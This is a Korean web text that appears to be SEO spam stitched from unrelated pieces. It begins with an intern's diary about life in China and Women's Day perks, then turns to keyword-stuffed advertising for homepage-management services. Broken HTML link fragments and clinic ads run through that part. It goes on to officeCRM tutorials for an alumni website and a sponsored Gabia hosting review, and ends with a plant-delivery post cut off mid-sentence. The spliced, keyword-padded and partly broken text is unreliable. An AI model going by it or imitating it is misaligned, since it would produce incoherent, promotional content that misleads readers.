​시장조사로 한창 바쁘던 와중에갑자기 우리 부서 직원언니가 대뜸오더니  다음주에 텐진출장을 가야한다고 했다.띠용? 인턴 주제에 벌써 출장을 가다니~!~!너무 기대가 되는 다음주 ^_^​​​​​   ​일 이야기는 잠깐 여기서 멈추고..ㅎ퇴근길에 하늘이 맑길래 한컷 찍어봤다.​​​​​      ​이번주에 집에서 먹은 집밥들​- 중국음식만 먹다보니 느끼해서 해먹은 담백한 한국 식단(계란말이와 된장국),단호박카레-북경대 마라샹궈가 그리워서직접 해먹은 마라샹궈 (대.성.공)​​​​    ​평일에는 아침이랑 점심을전부 중국식으로 먹다보니 느끼해서어느날 저녁은 과일로 대체해서 먹었다.망고랑 용과!중국은 한국보다 과일이 훨-씬 저렴하고종류도 많아서 부담없이 먹을 수 있다.​​​​​   ​과일 먹고 나서 쓰레기 버리러 내려갔다가 사온 과자중국판 꼬북칩!과자 봉지 절반이 헨리 얼굴이다ㅋㅋㅋㅋㅋ​​​​​   ​어쩌다보니 헨리 얼굴부분만 뜯었다..ㅎ원래 누워서 과자먹으면서 책읽으려고 했는데(누워서 과자만 먹었다고 한다)​요즘 페미니즘에 관심이 생겨서 한국에서 가져온 페미니즘 입문서!아직 한 챕터 밖에 못 읽었다 ㅠㅠ한주에 한 챕터씩 읽는게 목표이다.​​​​​    ​그리고 이번주 들어서 알게 된 3월 8일 세계 여성의 날​-회사 지하에 있는 비싼 레스토랑에서 여성의 날을 맞이해서 2일간 과일주스 반값행사를 하길래 사먹은 망고사과주스​-여성의 날이라고 타오바오에서 세일을 한다는 광고​​​​​   ​그리고 3월 8일 아침,출근하자마자 여성의 날이라고 회사 여직원들에게만 휴가가 제공되었다.여성의 날인건 며칠전부터 알고 있었는데회사에서 이렇게 챙겨줄거라고 생각도 못했었다.오전근무만 한다는 소식을 들었을때 기분이 굉장히 좋았다가'내가 만약 한국에서 인턴을 했었다면 이렇게 챙김을 받을 수 있었을까?'라는 의문이 들면서 진지한 생각에 잠겼다.​지나가는 소리지만 어제 중국인 룸메가 한국 남자들은 집안일을 잘 안도와주냐는 질문을 했었는데,요즘은 그러면 결혼 절대 못한다고 대답하면서우리 부모님 세대를 보면 여자만 집안일을 하는 경우가 참 많다고 이야기 했던 기억이 스쳐지나갔다.​​​​​​   ​여직원들에게만 제공된 회사 복지몰 포인트 카드인데회사 복지몰에서 100위안을 맘대로 쓸 수 있다. (헤헤)​생각지도 못한 휴가와 복지카드까지,,'어쩌면 중국이 한국보다 이런면에서 훨씬 앞서가고 있구나.' 싶었다.​​​<3주차 인턴일기 끝>   홈페이지관리비용 비교 가격 베스트 관련 추천정보모음입니다. 꼭 확인해보시기바랍니다.^^홈페이지관리비용 에 대해 가장 저렴하고 별점 높은순으로 모아봤으니 참고하고 비교해보세요 홈페이지관리비용 추천 네티즌이 적극적으로 이용하고 있는곳입니다.  아래 링크 클릭하시고 많은 정보 얻어가세요.   홈페이지관리비용 네티즌이 추천한 정보 보기           문의 하시면 속 시원히 알려드리겠습니다. 홈페이지,홈페이지제작,홈페이지관리,홈페이지제작비용,홈피큐 <질문> 안녕하세요~ 남성으류쇼핑몰을 하려고 하는데요.....  작업이 반복돼지만, 절대.. 비용이 비례해서 발생돼진... 하고.. 다달이 관리비를 요구하지요... 솔직히 홈페이지 관리 별로 필요없습니다. 처음부터 고객이...     라식수술비용 프리미엄 아마리스라식 라식수술비용"> 비용 프리미엄 아마리스라식 라식수술비용, [홈페이지유지보수] 상상팩토리, 홈페이지유지보수비용"> 상상팩토리, 홈페이지유지보수비용, 홈페이지 제작 비용">홈페이지 제작 비용, 모공치료 잘하는 곳 해운대피부과 모공축소 방법과 모공관리 비용"> 모공축소 방법과 모공관리 비용, 더블/트리플스키니전문 허벅지관리 더뷰클리닉의 H포덤술 비용에 대해서"> 허벅지관리 더뷰클리닉의 H포덤술 비용에... , 홈페이지 제작 비용 문의합니다 도와주셔용~^^">홈페이지 제작 비용 문의합니다 도와주셔용~^^, [라식라섹] 강남안과 라식라섹수술비용">[라식라섹] 강남안과 라식라섹수술비용, 스파노블 홈페이지 정혜림님의 얼굴관리 비용문의요">스파노블 홈페이지... 얼굴관리 비용문의요, 홈페이지- 홈페이지비용 -마케팅">홈페이지- 홈페이지비용 -마케팅, 라식수술비용 Premium라식 라식수술비용">라식수술비용 Premium라식 라식수술비용      질문) 얼굴성형경락을 받고싶은데요 비용이 어느정도 드는지 궁금해요... 혹시 관리를 광대뼈중심으로 받는것도 가능한지요?? 그리고 관리를 다받고 시간이...  홈페이지에 메뉴로는 품목별 동영상이랑 사진 추가하고 부연설명 하고 할 계획입니다. 흠... 어느정도 비용이... 배너 띄우는건 시청 관리팀의 허락을 받아야 되고요...                    저는 후회하지 않는 삶을 살고 싶은 사람인데요~ 여러분은 어떠세요?위인이나 고생해서 자신의 분야에서 최고가 된 사람들은 후회하지 않는다고 합니다.그만큼 열심히 살아왔기 때문에 다시 힘들이고 싶지 않고 지금의 성과도 아쉬운 거죠.여러분도 언제든 후회하지 않는 삶을 살기를 바랍니다. 오늘도 홈페이지제작및관리에 관한 정보를 찾아왔다면 후회가 없도록 확실히 알아가세요~!홈페이지의 제작 과정을 알려 드립니다.먼저 홈페이지의 기본이며 온라인 상에서도 사이트를 운영하기 위하여 꼭 필요한 웹호스팅은, 웹 서버를 임대하여 업체의 도메인을 웹주소로 등록하는 서비스를 의미하는 것입니다.이때 웹호스팅은 국내외 무료 호스팅 업체들이 있긴 하지만, 하드용량이나 일일전송량에 제약이 크고, 속도가 낮은 단점이 있습니다. 최근엔 저렴한 가격으로도 웹호스팅 사용이 가능하니, 홈페이지의 안정적인 서버 관리가 가능한 전문업체를 찾아보는 것이 좋습니다.다음으로 홈페이지 주소를 간편화 하려면 업체를 통해서 도메인을 구입해야 됩니다. 일반적으로 도메인은 1년 단위로 결제하며, 2만원 정도의 가격으로 책정되어 있습니다.이 때 도메인은 복잡한 이름을 사용하는 것보다 익숙한 단어들을 조합한 것으로 이용해야 고객들이 쉽게 인식하여 접속할 수 있습니다. 만약 홈페이지 전문회사가 도메인과 호스팅을 구매하면, 문제가 발생하였을 때 관리자를 찾기 어려워질 수 있어서 홈페이지 제작을 의뢰하기 전에 도메인과 호스팅을 직접 구입하는 것이 좋은 방법입니다.홈페이지의 경우, 백업이 필요한 때가 존재합니다.먼저 홈페이지 제작 완료 후 부족한 부분을 정리하다보면 수정한 부분이 마음에 들지 않아 원상태로 되돌아가고 싶은 경우가 있기 때문에 이때는 백업을 하는 것이 바람직합니다.또 홈페이지 관리 중 컨텐츠나 페이지를 잘못으로 삭제했을 경우를 대비해서 백업 작업은 필수입니다.홈페이지를 확실하게 백업해 두었다면 언제든지 원상복구가 가능합니다.비슷한 경우로 홈페이지가 해킹되어 트러블이 나타났을 경우는 백업 파일을 불러와 복원이 가능하다는 것을 참고하세요.따라서 사이트를 관리하신다면 백업은 꼭 계속해서 진행되어야 합니다.개인 제작과 다르게 홈페이지 기획물을 회사에 맡겼을 경우에 백업 계약을 약정해 놓으시면 좋습니다.계약 내용 상에 지속적인 기간마다 백업 문서를 제공받기로 명시해 둔다면 안전이 보장받을 수 있기 때문이랍니다. 참고로 이 때 어느 정도 규모가 있는 웹호스팅 업체는 자체 백업 프로세스가 있으므로 업체 결정 시 유념하시기 바랍니다.관능적이며 고객의 주목을 받을 수 있는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 고심하여 제작하고 있으며 소비자가 사용하기 용이하고인상깊은 업체가 될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 양질의 디자인을 제작해 드리겠습니다.이제 막 본 것도 까먹는다는 분들! 대충 읽고 지나가지 마시구요~ 오랫동안 기억하려면 복습이 중요합니다. 앞으로도 제 블로그에 자주 오셔서 홈페이지제작및관리 에 대한 유익한 정보 많이 얻어가세요!드디어 장장 3개월에 걸쳐 홈페이지와 관리시스템을 개발 완료하였습니다.기존의 플래시와 모바일이 지원이 안되는 홈페이지의 리뉴얼과 웹에서 관리하던 시스템을 완젼 새롭게 개편했습니다. http://www.다움상담코칭.com/​유투브영상 메인 타이틀 사용하고 다이내믹한 상담안내코너 이메일 문의 기능을 넣었습니다.당연 #SEO (검색최적화) 기능에 모바일까지 지원되는 반응형으로 구성하였습니다.또한 기존 홈페이지에서 관리가 불편했던 메인 이미지 교체 및 팝업기능, 게시물 관리 기능, 페이지 변경등 사용하기 쉽게 개편되었습니다.​보통 상담실 사이트는 상담소개에만 주력해서 홈페이지를 만듭니다. 하지만, 그것보다 중요한건 상담관리 입니다. 다움상담코칭은 모든 상담관련 업무를 웹에서 관리합니다.​상담신청을 하게 되면 바로 웹 관리시스템에 등록이 됩니다.일목요연 하게 볼 수 있는 상담스케쥴, 상담관리, 상담사관리, 상담실 관리, 교육 및 훈련관리, 상담내용 관리, 훈련과정관리 등 거의  ERP 수준의 시스템을 구축하였습니다.​ 또한 개인결제기능으로 상담비용을 홈페이지에서도 결제가능하게 하였으며, SMS문자도 웹에서 바로 발송하고 관리할 수 있게 하였습니다.아마도 국내에 이런 시스템을 갖추고 상담하는 곳은 거의 없다고 생각하는데요, 중견급 #상담실 을 운영하시는 곳은 이런 관리시스템이 꼭 필요한 것 같습니다.이런 관리시스템과 홈페이지가 필요하신 분은 #인톨 에게 문의해주세요. 이번 프로그램개발하면서 솔루션화 했기 때문에 저렴한 비용으로 공급이 가능해 졌습니다.http://intall.net 으로 문의 주시기 바랍니다. 인톨 : 인터넷의 모든것!저희 인톨은 관리하기 쉬운 홈페이지를 제작해 드립니다. 쉽게 관리하시고, 쉽게 운영하세요.intall.net  드디어 어려운 숙제 마치고 발 뻗고 잡니다. ㅎㅎ 홈페이지 관리 잘하는 업체 선정은 어떤 기준인가? 기존홈페이지 관리업체가 어느정도 귀사의 홈페이지 업데이트와 온라인상의 쉽게 노출되어신규 고객 확보에 기준을 둡니다. 홈페이지 호스팅 데이터 베이스용량, 전송량속도 등 기계적인 전반사항이 100%일 경우 사업주는가장먼저 홈피방문자와 신규 고객확보를 우선으로 봅니다 그러기 위해서는 홈페이지 관리업체선정을 잘해야 되는것은 필수입니다.    산업용품 산업기계 산업기자재,산업에 모든 홈페이지 전문 제작 관리까지   자신있는 업체를 소개합니다  (주)정보아이엔에스  02-2689-8191  www.jbins.co.kr  .www.gumaezi.co.kr www.jbins.co.kr홈페이지관리방법홈페이지관리업체회사홈페이지관리홈페이지제작홈페이지유지보수기업홈페이지관리홈페이지제작업체홈페이지홈페이지제작비용홈페이지수정홈페이지관리비용홈페이지관리알바쇼핑몰홈페이지관리학교홈페이지관리학원홈페이지관리홈페이지관리프로그램홈페이지관리사홈페이지관리법홈페이지관리교육개인홈페이지관리 '기업 관리 - 홈페이지 관리 ⑥'  ﻿저번 포스팅 ' [홈페이지 관리] ' 메인사진 & 배너 관리 '- 홈페이지 관리 ⑤ ' 에서는﻿﻿홈페이지 메인 사진과 배너를 등록하는 방법에 대해서 알아보았는데요,이어서 이번에는 동문들이 소속하고 있는 기업의 등록과 기업 소개, 연혁 등 상세 내용을 입력하는 방법에대해 알아보도록 하겠습니다.^^ 이번에도 역시 명지대학교 총동문회 홈페이지를 예시로 하여 설명드리겠습니다^^ 1.홈페이지 메뉴 등록하기  ' 메뉴 & 사용자 화면 관리'- 홈페이지 관리 ① ' 편에서 메뉴 등록 방법에 대해 자세히 설명되어있습니다.위의 링크를 클릭하시면 해당 사이트로 이동합니다. ①편을 참고하여 아래와 같이 메인 메뉴와 서브 메뉴가 등록해 주세요.이번 포스팅에서 기업안내 메뉴는 필요하므로 등록해주세요.   2.기업 등록 및 상세 내용 입력하기﻿﻿﻿﻿﻿﻿  명지대학교총동문회 홈페이지에서 [동문광장] 메뉴 → [기업안내] 메뉴를 클릭합니다.위에서 등록한 메뉴가 아래의 홈페이지에 적용된 것을 확인하실 수 있습니다. 아직 기업이 등록되어있지 않아 공란 상태 인데요,officeCRM 프로그램을 통해 기업 등록 및 소개, 연혁 등을 작성해보도록 하겠습니다.   officeCRM 프로그램을 열어주신 뒤,[업무관리] 메뉴 → [채용 관리] 메뉴 → [기업 등록] 메뉴를 클릭해주시면아래와 같이 '기업 등록' 창이 뜹니다. 등록할 기업의 기본사항을 적어주시고,기업 로고 약도 란은 '이미지등록' 버튼을 클릭하면 새로운 창이 뜨는데, 로고는 '로고' 약도는 '약도'로 구분 란에서 구분하여 이미지를 첨부하고'저장' 버튼을 클릭해주시면 됩니다.첨부사진 란은 기업 사진에 들어갈 이미지를 등록해주시면 됩니다.   홈페이지에 적용 결과 입니다.등록한 기업의 이름과 이미지 첨부한 로고가 아래와 같이 기업 안내의 메인에 적용되어 나타납니다. ※ 위의 프로그램에서 기업 등록 시 기본사항 중프리미엄 기업은 기업레벨을 0~3 사이로 선택하며 아래와 같이 홈페이지에 청록색 박스로 나타나고,일반 기업은 기업레벨을 4~6 사이로 선택하며 아래와 같이 홈페이지에 회색 박스로 나타납니다. 등록한 기업 박스 안의 우측 하단 '상세' 버튼을 클릭하면기업소개, 기업사진, 연혁 · 약도, 채용정보 등 기업에 대한 상세 페이지가 뜹니다.다음은 상세 페이지에 대한 내용을 작성해 보도록 하겠습니다.^^ 먼저 등록한 기업의 '기업소개' 란에 들어갈 내용을 만들어 보도록 할텐데요,앞에서 등록한 '기업 등록' 창의 '기본사항' 탭 좌측의 '기업소개' 탭을 클릭한 후,우측의 '등록' 버튼을 클릭해줍니다.^^  아래와 같이 '기업소개 등록' 창이 열립니다.공란 안에 내용을 작성한 뒤 '저장' 버튼을 클릭합니다. '저장' 버튼을 클릭하면 '기업소개' 란 안에작성한 내용이 적용된 것을 확인하실 수 있습니다.^^다시 '저장' 버튼을 클릭해주세요.    기업이 제대로 등록되었는지 보기 위해[업무관리] 메뉴 → [채용 관리] 메뉴 → [기업 목록] 메뉴를 클릭하면 확인하실 수 있습니다.아래와 같이 등록한 기업이 목록에 나옵니다.  홈페이지의 기업 박스 안의 '상세' 버튼을 클릭합니다.   < 기업소개 > 탭을 클릭하면위에서 프로그램을 통해 작성한 내용들이홈페이지의 '기업정보' 란과 '기업소개' 란에 적용된 것을확인하실 수 있습니다.^^   다음은 연혁, 기업댓글 란을 작성해보도록 하겠습니다.^^ < 연혁 · 약도 > < 기업사진 >    다시 officeCRM 프로그램을 열어주신 뒤, [업무관리] 메뉴 → [채용 관리] 메뉴 → [기업 목록] 메뉴를 클릭합니다. 다음과 같이 '기업 목록' 창이 뜨면 좌측의 연필모양 아이콘을 클릭해주세요. 아이콘을 클릭하시면 아래와 같이 '기업상세' 창이 뜹니다.'기업상세' 창에는 기업 정보와 기업소개, 기업사진 등작성했던 모든 정보들을 확인하실 수 있습니다.^^ [기업연혁] 탭을 클릭 후, 우측의 '등록' 버튼을 클릭하면'경력 등록' 이라는 새로운 팝업 창이 뜹니다.등록할 연혁의 시작 일자, 종료 일자, 경력 사항에 대해 입력 후저장 버튼을 누르면 [기엽연혁] 란에 경력이 추가된 것을 확인하실 수 있습니다.^^   다음은 댓글을 등록하는 방법에 대해 알아보도록 할텐데요,'기업상세' 창에서 [기업댓글] 탭을 클릭합니다.하단에 댓글을 작성한 후 저장을 클릭하면[기업댓글] 란 안에 작성된 댓글을 확인하실 수 있습니다.  홈페이지에 적용된 결과 입니다^^ < 연혁 · 약도 >  ﻿﻿ < 기업댓글 >  이어서 다음 포스팅에서는 동문들이 소속하고 있는 기업 등록에 이어동문들을 대상으로 한 등록된 기업의 채용 등록에 대해 알아보도록 하겠습니다.^^                  관리업체 옥션부분 판매추이꾸준히 매출성장을 이루고 있다.리스팅을 제외한 하루광고비는 2만원이하이다.[셀러온 홈페이지 보러가기]​​​ ​​안녕하세요 !!​서울 / 경기 / 인천 지역 아웃소싱 회사 및 기업 대표홈페이지 제작은 저희와 함께 정확하고 자세한 상담을 받아보신 후, ​원하시는 그대로의 홈페이지를 높은 퀄리티와 완성도로 제작해 보시기 바랍니다.​우선, 홈페이지를 제작하실 때 어떤 목적과 방향으로 홈페이지를 제작하시는지 명확하게 정리가 되어 있어야 홈페이지 제작 이후, 좀 더 원하시는 홈페이지를 받아보실 가능성이 높은데요 ~​​똑같은 아웃소싱 회사와 기업이라도 홍보용으로 간단하게 정보를 제공하는 목적으로 제작이 되야 하는지, 많은 사람들이 홈페이지에 접속하여 이력서를 업로드하고, 원하는 일자리에 신청을 할 수 있도록 ＃사업 ＃업무 수행에 있어효율적으로 진행할 수 있도록 제작이 되어야 하는지 등등 에 따라 전혀 다른 느낌과 분위기의 홈페이지가 제작이 되기 때문에홈페이지 제작 전, 이러한 부분을 명확하게 정리하신 후 제작을 진행하셔야 합니다.​또한, 같은 업종 및 분야라고 해도 홈페이지 사용용도 / 컨셉 / 디자인 / 구성 / 필요기능 들에 따라 회사와 기업들 만의특징과 개성을 가지고 홈페이지를 제작하실 수 있기 때문에 대표 홈페이지를 제작하시려면 맞춤형으로 제작 하시는 것이제작이후 좀 더 활용도 높게 사용하실 수 있습니다.​ ​​맞춤형 홈페이지는 고객님이 원하시는 ＃컨셉 ＃디자인 ＃기능 ＃메뉴구성에 맞춰 처음부터 새롭게 하나하나 단계별로 제작이 진행되는 홈페이지 제작 방식으로, ​얼마든지 원하시는 홈페이지로 제작하실 수 있어​홈페이지 제작 완료 후, 만족도와 퀄리티가 높은 결과물을 받아보실 수 있습니다.​​저희는 퀄리티와 만족도 높은 홈페이지를 제작해 드리고 있는 맞춤형 홈페이지 제작 전문업체로 19 년 경력의 다양한 업종 홈페이지들을제작한 경험과 노하우를 바탕으로 고객님의 의견을 최우선시하여 홈페이지를 제작해 드리고 있습니다.​홈페이지 제작이 처음 이신분들은 맞춤형으로 홈페이지를 제작하시기 전, 다양한 동종업계 홈페이지들을 둘러보시고'우리' 회사와 기업만의 홈페이지 구성을 미리 생각해 두시는 것이 좋습니다.​완벽하지는 않지만 대략적으로라도 홈페이지 제작에 대해 어느정도 감을 잡으실 수 있기 때문에좀 더 수월하게 홈페이지 제작을 진행하실 수 있습니다 !!!​만약 어떻게 / 어디서 부터 홈페이지 제작 준비를 시작해야 할 지 어려우신분들은 저희가 ＃서울 ＃경기 ＃인천 지역은 직접 방문미팅드려자세하게 내용정리와 상담을 진행드리고 있으니 미팅이 가능하신 지역에 계시다면 한번 꼭 ! 진행해 보시기 바랍니다.​생각하시고 있으시거나, 홈페이지 제작에 있어 궁금하신점들을 가장 빠르고 정확하게 제작업체에 전달해 줄 수 있는 방법은제작업체와 함께 직접 미팅을 하는 것 이라고 할 수 있습니다 ~​​홈페이지 제작 완료 후에는 모든 원본소스를 제공해 드리고 소유권을 이전해 드리고 있어 오랫동안 효율적으로 홈페이지를 유지, 관리 하시면서 사용하실 수 있습니다.​​ ​​맞춤형 홈페이지 제작의 가장 큰 장점은 얼마든지 자유롭게 홈페이지를 제작하여 오랫동안 효율적으로 사용할 수 있다는 점 입니다.​아웃소싱 기업 및 회사 대표 홈페이지 제작 계획이 있으신 분들은 믿을 수 있고 실력과 기술력을 지닌 저희에게언제든지 연락 및 문의주시면 자세한 설명 진행드리겠습니다 ~!​◆☆ 클릭 ~ 감각디자인 홈페이지 바로가기 !!! ☆◆ ​​  월 '5만원'으로 홈페이지 제작 및 관리대행, 가비아 홈페이지 관리대행! 정보화 시대인만큼 기업이든 개인이든 홍보를 위한 중요한 첫걸음은 '홈페이지'가 되었습니다. 하지만 홈페이지를 전혀 모르는 이들에게 홈페이지를 장만하기란 여간 어려운 일이 아닐 수 없습니다. 만드는 법을 배우자니 그 기간이 까마득하고 돈을 주고 만드자니 엄청난 제작비용때문에 선뜻 결정을 하지 못하다 그만 둬버리는 경우가 다반사입니다.​그런 분들을 위해 가비아에서 새로운 솔루션을 내놓았는데요, 홈페이지 제작 및 유지보수, 도메인제공까지  단돈 월 5만원으로 누릴 수 있는 초보자용 솔루션입니다. 홈페이지가 필요하지만 막상 어디부터 시작해야 할지 전혀 모르는 문외한인 분들께 강력 추천드립니다.​​​​​먼저 가비아를 간단히 소개하자면 아사달, 카페 24 등과 더불어 우리나라 웹 호스팅 관련 기업 부문에서 최고를 자랑하는 메이저 기업 중 한곳입니다. 홈페이지 제작 경험이 있으시거나 웹 관련 업무를 하시는 분들은 이미 알고 계시는 분들이 많으실거라 생각합니다. 중소기업의 호스팅 업체도 많지만 문을 닫는 경우가 잦기 때문에 홈페이지가 패쇄되버리거나 더이상 유지보수가 어려워지는 경우가 많습니다. 그러므로 오래오래 운영할 웹사이트라면 되도록이면 큰 기업에서 시작하는게 여러모로 좋습니다.​​​​​​​​▶가비아 홈페이지 관리대행 소개​지금부터 가비아에서 지원하는 홈페이지 관리대행 서비스를 소개할껀데요~ 홈페이지 관리 서비스는 위 그림과 같이 상단메뉴의 웹사이트-> 홈페이지 관리대행 탭에서 이용할 수 있습니다. 그럼 서비스 신청으로 들어가 보겠습니다^^​​​​​​​​​가비아 홈페이지 관리대행 서비스는 2가지 형태로 분류됩니다. 초보자용이나 개인용, 간단한 홈페이지 형태로 사용할 수 있는 베이직형(월 5만원), 홈페이지 보안 및 서비스 횟수가 조금 더 추가되는 스탠더드형(월 15만원)이 있습니다. 해킹위험 확률이 높거나 보안이 필요한 웹사이트가 아니라면 베이직으로 이용하셔도 무방할 것 같습니다. 그리고 현재 이벤트중이라 12개월 이상 신청했을 시 가격이 할인되니 참고하셔도 좋을 것 같습니다.^^그럼 베이직으로 신청해 보겠습니다. (서비스를 신청하려면 회원가입이 필요하니 먼저 가입 후 이용하셔야 합니다.)​​​​​​​​먼저 관리받을 사이트 부분에 홈페이지 주소로 쓸 도메인을 입력해 주세요. com, net, kr 모두 가능합니다. 도메인을 입력하셨다면 도메인 체크 버튼을 눌러 최종 확인 후 무료임대 신청을 눌러주세요. 서비스타입은 홈페이지 빌더로 선택해 주시고 이용기간은 필요에 따라 설정해 주시면 되겠습니다. 모두 입력하셨다면 약관 동의 체크 후 다음 단계로 넘어가 주세요.​​​  ​​​​결제페이지 입니다. 할인 및 결제 수단에서는 쿠폰이나 포인트가 없으시면 그대로 공백으로 두시고 아래 결제 수단 방법을 선택하여 오른쪽 결제하기 버튼을 눌러 최종 결제하시면 됩니다.​​​​​​​​결제를 하면 원하는 홈페이지 디자인을 선택할 수 있습니다. 홈페이지의 용도에 따라 분류별로 나뉘어져 있으며 디자인 또한 기본 스킨 치고 유료 제작 사이트 못지 않게 이쁘게 만들어져 있습니다.​​​ ​​​​스킨을 하나 선택하여 적용시켜보았습니다. 최근 트랜드에 맞는 텍스트 코딩은 물론 크로스 브라우징 까지 완벽히 되어있어 무난하게 사용하기에는 더할 나위가 없습니다.​​​​​​​​제공 되는 홈페이지의 관리자 페이지입니다. 사이트에서 운영되는 회원 관리나 게시물 관리 등을 할 수 있고 포토샵 사용이 가능하다면 이미지 편집도 가능하며 코딩까지 가능하다면 소스를 변경해서 자신만의 사이트를 만들 수 도 있습니다.​​​​​​​​관리자 페이지에서 처리가 불가능하거나 초보자라 수정이 어려울 경우 작업요청을 통해 도움을 받을 수 있습니다. 신청을 하면 평일 09:00~18:00 사이에 접수된 건에 한해 당일 상담이 가능하다고 하니 이를 통해초보자분들도 쉽게 관리가 가능할 것으로 보입니다. 그리고 기본적으로 계약되어 있는 오탈자, 단순링크 수정 등은 무료로 바로 진행되지만 일부 ​작업은 요금이 추가 될 수 있습니다.​​​​​​​지금까지 가비아 홈페이지 관리 대행 서비스에 관한 리뷰였습니다. 홈페이지를 제작하고 싶은데 비용이 걱정되시는 분! 막상 만들고 나서 유지보수가 걱정되시는 분! 기본 틀을 제공 받고 자신만의 사이트를 구축하고 싶은 중급자 분들께 강력 추천 드립니다^^​​​↑추천 부탁드립니다^^ ​​​​이 글은 위드블로그에서 제품 또는 서비스를 지원받아 작성된 글 입니다. ​​   ​   ​  '게시판 관리 - 홈페이지 관리 ②'  ﻿저번 포스팅 ' [홈페이지 관리] 메뉴 & 사용자화면 관리 - 홈페이지 관리 ① ' 에서는 홈페이지 메뉴 등록과,사용자페이지관리 등록에 대해 알아보았는데요.이어서 이번에는 홈페이지 게시판을 등록하는 방법에 대해 알아보도록 하겠습니다.^^게시판은 사용자들끼리 소통하는 공간이니 만큼 친목면 뿐 만아니라  빠르게 다른 사용자들에게 정보를 알릴 수 있는 공간이기 때문에  메뉴에서 빠지지 않는 공간이니 활용 하면 더욱 더 좋을 것 같습니다.^^명지대학교 총동문회 홈페이지로 예시를 들어 설명드리도록 하겠습니다~ 아래는 지금 사용하고 있는 명지대학교총동문회 자유게시판입니다~^^ 굉장히 여러방면에 글이 많이 올라오죠?^^      자 그럼 이제 본격적으로 게시판 관리법에 대해 알아보겠습니다~    1.서브 메뉴에 게시판 추가하기 우선 저번 포스팅과 마찬가지로 게시판을 적용할 서브 메뉴를 만들기 위해[홈페이지관리] 메뉴 → [홈페이지메뉴관리] 메뉴에서 메인 메뉴를 선택한 뒤 '등록' 버튼을 클릭합니다.  팝업 창이 뜨면 저번 포스팅에서 등록했던 방법과 같이 배너 이미지와, 메뉴 이미지를 등록해줍니다.이 때, 게시판을 추가하기 위해서 왼쪽의 2nd 메뉴 유형 리스트에서 '게시판'을 선택합니다.선택하시면 오른쪽에 자동으로 URL값이 표시됩니다.   2nd메뉴 제목과, 배너이미지, 메뉴이미지를 첨부하고'저장' 버튼을 클릭합니다.   2.메뉴에 게시판 적용하기 [커뮤니티] 메뉴 → [게시판관리] 메뉴에서 '등록' 버튼을 클릭해주세요. 게시판 이름은 서브 메뉴와 동일하게 입력합니다. 게시판 타입은 'Board' 로 선택해주시고, 게시판 ID를 지정합니다. 이 때, 게시판 ID의 값을 복사해주세요.^^ 게시판 읽기,쓰기,답변,댓글 여부는 + 게시판 Level + 칸을 참고하여,임의대로 선택합니다. 정렬 순서 또한 원하는 순서로 입력해주시면 됩니다.작성이 끝나셨다면 '등록' 버튼을 눌러줍니다.  다시 [홈페이지관리] 메뉴 → [홈페이지메뉴관리] 메뉴를 클릭합니다.위에서 만들었던 서브 메뉴의 제목을 클릭하여 팝업 창을 열어주세요. 팝업 창이 뜨면 Parameter 란에 ' boardID=복사한 게시판ID '형식으로 입력한 후 '저장' 버튼을 눌러주세요.^^ex) boardID=Notice  홈페이지에 적용 결과 아래와 같이 게시판이 추가된 것을 확인하실 수 있습니다.^^  3.officeCRM 프로그램에서 게시글 추가하기officeCRM 프로그램을 열어주신 뒤상단의 [커뮤니티] 메뉴 → [사내게시판(Board)] 메뉴 를 클릭해주시면아래와 같은 창이 뜹니다.  관리자 웹에서 등록한 게시판 목록을 확인할 수 있습니다.해당 게시판의 제목을 선택한 후 '글쓰기' 버튼을 클릭합니다.  클릭하면 [게시판 등록] 창이 뜹니다.공지사항에 전하고자 하는 내용을 입력해주시고 '저장'해주시면 됩니다.^^파일 첨부는 게시글을 작성한 후 '저장' 한 다음 파일 첨부가 가능하니파일을 첨부하기 전에 작성한 게시글을 저장합니다.  게시글 작성을 완료한 뒤 저장을 누르시면작성한 게시글이 리스트에 뜹니다.댓글과 조회 수도 확인하실 수 있습니다.   게시글의 제목을 더블 클릭하면 '게시글 수정' 화면으로 이동합니다.파일 첨부를 위해 '찾아보기...' 버튼을 클릭하여 이미지를 첨부합니다.  이미지 파일 첨부 후 '파일첨부' 버튼을 클릭하면 첨부된 파일 명을 확인할 수 있습니다.  첨부된 이미지 제목 앞의 [+] 버튼을 클릭하면첨부한 이미지가 글 내용에 보여집니다.이미지와 크기의 위치를 조절하여 글 내용을 수정한 후 [저장] 버튼을 클릭합니다.    4.적용 결과를 홈페이지에서 확인 하기명지대학교총동문회 홈페이지에서[총동문회소식] 메뉴 → [공지사항] 메뉴를 클릭해주시면아래와 같이 작성했던 게시글이 추가된 것을 확인하실 수 있습니다. 게시글의 제목을 클릭하시면 작성한 글 내용이 뜹니다.^^ 메뉴와 사용자페이지 등록 방법에 이어, 게시판을 추가하는 방법을 알아보았는데요,게시판은 용도에 따라 다양하게 쓰일 뿐만 아니라 고객과 소통할 수 있는 공간이므로 지속적인 업데이트와 관리가 필요합니다.이제 officeCRM과 함께 고객과의 커뮤니케이션을 이어나가세요.             #평택홈페이지 #평택 #쇼핑몰홍보 #디자인 #명함 #식물인테리어 #평택개업화분 #집들이선물 #이전개업선물 #공기정화식물 #플랜테리어온 #유니크넷#개업화분 #아가페 #안시리움 #아레카야자​​사무실확장이전 축하선물로 초록이를 주문해주신 고객님~♡탁월한 선택이세요~♡  초록이는 분위기 깡패~♡공간의 멋을 살려주는것이 초록이의 능력.​고객님이 선택하신 안시리움과플랜테리어온이 추천한 아가페보는것만으로 청량한 아레카야자를 데리고​ 유니크넷경기도 평택시 서재2길 23으로 출발~♡       도착!!^^​유니크넷 구경 해볼까요?             ​들어가니 사장님은 고객님 미팅중이시라.. 조용히 살금살금 초록이 놓고 사진 먼저 찍고..     어울리나요?^^​주문하신 고객님의 센스가 돋보이는 안시리움~♡안시리움은 하트모양 잎으로 꽃이 피지 않아도 잎자체가 고급지고 키우는 난이도가 아주 낮아서 편하게 선물하기 좋은 식물이에요~​아가페는 생긴것과 다르게 다육식물이라 물을 자주 주지 않는것이 좋고햇빛 받는것을 좋아해서 사무실 창가에 잘 어울리는멋스러운 녀석이지요~​아레카 야자는 물만주면 쑥쑥 자라는멋진아이~♡예잔에 포스팅한 아레카 야자 특별편 링크합니다~^^ 아레카 야자#아레카야자 #공기정화식물 #식물인테리어​이반 포스팅으로 소개해드릴 초록이는 바로~​아레카 야자 되겠...m.blog.naver.com ​이제.. 유니크넷 대표님을 만나볼까요?   미모의 